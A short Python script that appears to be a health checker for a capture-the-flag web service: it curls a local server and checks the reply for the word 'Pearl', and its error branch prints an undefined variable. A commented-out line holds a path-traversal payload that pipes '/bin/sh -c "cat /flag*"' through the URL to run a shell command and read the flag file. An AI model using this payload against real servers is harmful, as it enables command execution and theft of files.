#!/usr/bin/env python3

import requests
import os

#cmd = """curl 'http://localhost:8080/."."/."."/."."/."."/."."/."."/."."/."."/."."/."."/bin/sh%20-c%20"cat%20/flag*"%20|'"""
#cmd = "echo ictf"
cmd = "curl http://localhost:8080/"
try:
  res = os.popen(cmd).read()
  if "Pearl" in res:
    exit(0)
  else:
    print(r)
    exit(1)
except Exception as e:
  print(e)
  exit(1)
